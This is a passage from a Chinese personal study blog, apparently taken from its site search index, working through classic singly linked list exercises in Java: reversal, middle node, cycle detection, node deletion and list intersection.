当pre走到链表末端时，post正好指向倒数第K个节点</span></span><br><span class="line">        <span class="keyword">while</span> (pre != <span class="literal">null</span> &amp;&amp; pre.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            pre = pre.next;</span><br><span class="line">            post = post.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> post;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="反转链表"><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h4><p>这个题太精髓了，虽然在leetcode上标注为简单题，但我最开始看的时候看了很久都没看明白（主要还是自己对链表不是那么收悉），下面的解法为迭代的方法，这个方法看上去要清楚一点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseLinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">    Node&lt;E&gt; cur = head.next; <span class="comment">// 原链表</span></span><br><span class="line">    Node&lt;E&gt; pre = <span class="literal">null</span>; <span class="comment">// 反转后的链表</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="literal">null</span>) &#123; <span class="comment">// 对原链表中的每个节点进行反转</span></span><br><span class="line">        Node&lt;E&gt; next = cur.next; <span class="comment">// 记录当前节点的下一个节点</span></span><br><span class="line">        cur.next = pre; <span class="comment">// 当前节点指向反转后的链表</span></span><br><span class="line">        pre = cur; <span class="comment">// 更新反转后的链表</span></span><br><span class="line">        cur = next; <span class="comment">// 更新当前节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    head.next = pre; <span class="comment">// 将原链表的头结点指向反转后的链表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="在不知道头结点的前提下，删除指定节点"><a href="#在不知道头结点的前提下，删除指定节点" class="headerlink" title="在不知道头结点的前提下，删除指定节点"></a>在不知道头结点的前提下，删除指定节点</h4><p>这一题好像是没法用单链表来实现的，如果用单链表实现，如果指定的节点为尾结点是无法删除的，因为不知道它的前一个节点，也就无法知道它的位置，没办法把它赋值为null。但是可以用双链表实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">deleteNodeWithoutHead</span><span class="params">(Node&lt;E&gt; node)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">null</span> || node.next == <span class="literal">null</span>) &#123; <span class="comment">// 当指定节点为空或者为尾节点时，无法删除</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Node&lt;E&gt; next = node.next;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将后继节点的内容复制到当前节点</span></span><br><span class="line">    node.data = next.data;</span><br><span class="line">    node.next = next.next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="寻找单链表中的中间节点-双指针法"><a href="#寻找单链表中的中间节点-双指针法" class="headerlink" title="寻找单链表中的中间节点(双指针法)"></a>寻找单链表中的中间节点(双指针法)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printMiddleNodes</span><span class="params">()</span> &#123;</span><br><span class="line">    Node&lt;E&gt; index1 = head.next; <span class="comment">// 慢指针</span></span><br><span class="line">    Node&lt;E&gt; index2 = head.next; <span class="comment">// 快指针</span></span><br><span class="line">    <span class="keyword">if</span> (head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">        System.out.println(index1.data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (index2 != <span class="literal">null</span> &amp;&amp; index2.next != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; index2.next.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        index1 = index1.next;</span><br><span class="line">        index2 = index2.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.print(index1.data); <span class="comment">// 第一个中间节点</span></span><br><span class="line">    <span class="keyword">if</span> (index2.next != <span class="literal">null</span>) &#123; <span class="comment">// 当链表长度为偶数时，打印第二个中间节点</span></span><br><span class="line">        System.out.println(index1.next.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="判断单链表是否有环-双指针法"><a href="#判断单链表是否有环-双指针法" class="headerlink" title="判断单链表是否有环(双指针法)"></a>判断单链表是否有环(双指针法)</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasLoop</span><span class="params">()</span> &#123;</span><br><span class="line">    Node&lt;E&gt; index1 = head.next; <span class="comment">// 慢指针</span></span><br><span class="line">    Node&lt;E&gt; index2 = head.next; <span class="comment">// 快指针</span></span><br><span class="line">    <span class="keyword">while</span> (index2 != <span class="literal">null</span> &amp;&amp; index2.next != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; index2.next.next != <span class="literal">null</span>) &#123;</span><br><span class="line">        index1 = index1.next;</span><br><span class="line">        index2 = index2.next.next;</span><br><span class="line">        <span class="keyword">if</span> (index1 == index2) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="链表相交问题"><a href="#链表相交问题" class="headerlink" title="链表相交问题"></a>链表相交问题</h4><h5 id="判断当前链表与目标链表是否相交-相交与否取决于尾节点是否相同"><a href="#判断当前链表与目标链表是否相交-相交与否取决于尾节点是否相同" class="headerlink" title="判断当前链表与目标链表是否相交(相交与否取决于尾节点是否相同)"></a>判断当前链表与目标链表是否相交(相交与否取决于尾节点是否相同)</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isIntersect</span><span class="params">(LinkedList&lt;E&gt; list2)</span> &#123;</span><br><span class="line">    Node&lt;E&gt; cur1 = head.next;   <span class="comment">// 当前链表</span></span><br><span class="line">    Node&lt;E&gt; cur2 = list2.getHead().next;  <span class="comment">// 目标链表</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 两链表有一个为空，则返回 false</span></span><br><span class="line">    <span class="keyword">if</span>(cur1 == <span class="literal">null</span> || cur2 == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历到第一个链表的尾节点</span></span><br><span class="line">    <span class="keyword">while</span>(cur1.next != <span class="literal">null</span>)&#123;</span><br><span class="line">        cur1 = cur1.next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历到第二个链表的尾节点</span></span><br><span class="line">    <span class="keyword">while</span>(cur2.next != <span class="literal">null</span>)&#123;</span><br><span class="line">        cur2 = cur2.next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cur1 == cur2;  <span class="comment">// 相交与否取决于尾节点是否相同</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="返回两链表的交点-若不相交，返回null"><a href="#返回两链表的交点-若不相交，返回null" class="headerlink" title="返回两链表的交点(若不相交，返回null)"></a>返回两链表的交点(若不相交，返回null)</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Node&lt;E&gt; <span class="title function_">getIntersectionPoint</span><span class="params">(LinkedList&lt;E&gt; list2)</span> &#123;</span><br><span class="line">    Node&lt;E&gt; cur1 = head.next;   <span class="comment">// 当前链表</span></span><br><span class="line">    Node&lt;E&gt; cur2 = list2.getHead().next;  <span class="comment">// 目标链表</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">this</span>.isIntersect(list2))&#123;  <span class="comment">// 先判断是否相交</span></span><br><span class="line">        <span class="comment">// 让长度较长的链表先移动step步</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">step</span> <span class="operator">=</span> Math.abs(list2.size - <span class="built_in">this</span>.size);</span><br><span class="line">        <span class="keyword">if</span>(list2.size &gt; <span class="built_in">this</span>.size)&#123;</span><br><span class="line">            <span class="keyword">while</span>(step &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                cur2 = cur2.next;</span><br><span class="line">                step --;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(list2.size &lt; <span class="built_in">this</span>.size)&#123;</span><br><span class="line">            <span class="keyword">while</span>(step &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                cur1 = cur1.next;</span><br><span class="line">                step --;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//两个指针同时移动，一旦指向同一个节点，即为交点</span></span><br><span class="line">        <span class="keyword">while</span>(cur1 != cur2)&#123;</span><br><span class="line">            cur1 = cur1.next;</span><br><span class="line">            cur2 = cur2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果只是用最基础的链表，没有size，那么还需要两次循环遍历出两个链表的大小，此时还有另外一种解法（双指针）：<br>头节点 headA 到 node 前，共有 a - c 个节点；<br>头节点 headB 到 node 前，共有 b - c 个节点；<br>指针 A 先遍历完链表 headA ，再开始遍历链表 headB ，当走到 node 时，共走步数为：a+(b−c)<br>指针 B 先遍历完链表 headB ，再开始遍历链表 headA ，当走到 node 时，共走步数为：b+(a−c)<br>如下式所示，此时指针 A , B 重合，并有两种情况：<br>a+(b−c)&#x3D;b+(a−c)</p><p>若两链表 有 公共尾部 (即 c &gt; 0 ) ：指针 A , B 同时指向「第一个公共节点」node 。<br>若两链表 无 公共尾部 (即 c &#x3D; 0 ) ：指针 A , B 同时指向 null 。<br>解题代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">A</span> <span class="operator">=</span> headA, B = headB;</span><br><span class="line">        <span class="keyword">while</span> (A != B) &#123;</span><br><span class="line">            A = A != <span class="literal">null</span> ? A.next : headB;</span><br><span class="line">            B = B != <span class="literal">null</span> ? B.next : headA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>个人学习小结，其中可能有错误，还望在下方评论指出 &#x3D; V &#x3D;</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>链表</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
